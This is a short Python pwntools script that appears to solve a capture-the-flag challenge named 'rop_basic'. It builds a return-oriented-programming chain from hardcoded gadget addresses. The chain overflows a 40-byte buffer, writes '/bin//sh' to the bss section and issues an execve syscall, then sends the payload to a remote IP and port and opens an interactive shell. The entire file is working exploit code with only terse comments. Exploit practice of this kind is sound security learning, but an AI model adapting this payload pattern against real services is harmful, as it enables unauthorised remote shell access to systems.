from pwn import *

## gadgets
pop_rax = p64 (0x00000000004489ec)
pop_rdx = p64 (0x0000000000447fb5)
pop_rdi = p64 (0x0000000000401796)
pop_rsi = p64 (0x0000000000406f80)
syscall = p64 (0x0000000000402514)
bss = p64 (0x00000000004ba300)
text = b'/bin//sh'
mov_rdi_rsi = p64 (0x00000000004456cb)


payload = b''
payload += b'a'*40

# setting rax (0x3b)
payload += pop_rax
payload += p64 (0x3b)

# setting rdi ('/bin/sh'
payload += pop_rdi
payload += bss
payload += pop_rsi
payload += text
payload += mov_rdi_rsi

# zeroing rdx and rsi
payload += pop_rdx
payload += p64 (0x0)
payload += pop_rsi
payload += p64 (0x0)

# syscall
payload += syscall

'''
# tricky to run with gdb easy way
f = open ('buff', 'wb')
f.write (payload)
f.close ()
'''

#p = process ('./rop_basic')
p = remote ('168.119.123.141', 8091)
p.recvuntil (b'here!\n')
p.sendline (payload)
p.interactive ()
